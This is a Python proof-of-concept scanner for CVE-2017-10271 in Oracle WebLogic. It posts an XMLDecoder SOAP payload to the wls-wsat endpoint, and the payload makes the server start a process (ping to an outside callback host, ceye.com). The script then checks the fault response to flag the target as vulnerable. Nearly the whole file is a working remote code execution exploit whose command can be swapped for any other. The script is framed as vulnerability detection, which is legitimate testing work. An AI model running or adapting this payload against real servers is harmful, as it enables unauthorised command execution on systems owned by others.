#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''

Program：Weblogic Scan
Function：Weblogic All Version Vul Scan
 
Version：Python3
Time：2019/12/25
Author：bywalks
Blog：http://www.bywalks.com
Github：https://github.com/bywalks

'''
import sys

import requests
import re
import logging

VUL=['CVE-2017-10271']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(url,index):
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
    else:
        print('[-]Target weblogic not detected {}'.format(VUL[index]))


def run(rip,rport,index):
    url=rip+':'+str(rport)
    poc(url=url,index=index)

if __name__ == '__main__':
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    run(dip,dport,0)